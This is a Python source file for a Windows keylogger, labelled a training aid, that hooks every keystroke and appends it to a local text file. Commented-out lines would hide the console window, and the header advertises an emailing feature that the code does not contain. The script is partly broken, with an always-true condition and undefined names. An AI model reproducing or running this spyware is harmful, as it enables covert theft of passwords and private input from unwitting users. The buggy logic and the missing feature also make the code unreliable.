# Python code for keylogger
# to be used in windows
#this is the basic keylogger with emailing abilities

# Copyrights @2018 MR.V IT Services
# *************************
# Emailed keylogging script
# Release : 0
# Revision : 11
# Release Day : Feb 25 2018
# ************************
import win32api
import win32console, win32gui, pythoncom, pyHook
import sys, smtplib, threading, win32api, time
import os


#### Comment these out for testing purposes
#win = win32console.GetConsoleWindow()
#win32gui.ShowWindow(win, 0)

dir_path = os.path.dirname(os.path.realpath(__file__))

def OnKeyboardEvent(event):
	if event.Ascii == 5:
		_exit(1)
	if event.Ascii != 0 or 8:
	#open output.txt to read current keystrokes
		f = open(dir_path + '\output.txt', 'r+')
		buffer = f.read()
		f.close()
	# open output.txt to write current + new keystrokes
		f = open(dir_path + '\output.txt', 'w')
		keylogs = chr(event.Ascii)
	if event.Ascii == 13:
		keylogs = '\n'
	buffer += keylogs
	f.write(buffer)
	f.close()
	
	
	
		
f1 = open(dir_path + '\output.txt', 'w')
f1.write('Incoming keys:\n')
f1.close()


# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()


# *************************************
# THIS IS MEANT TO BE A TRAINING AID
# THIS TOOL IS NOT MEANT FOR ANY MALICIOUS MEANS
# WHAT YOU DO WITH THIS TOOL IS ALL AT YOUR OWN RISK
# *************************************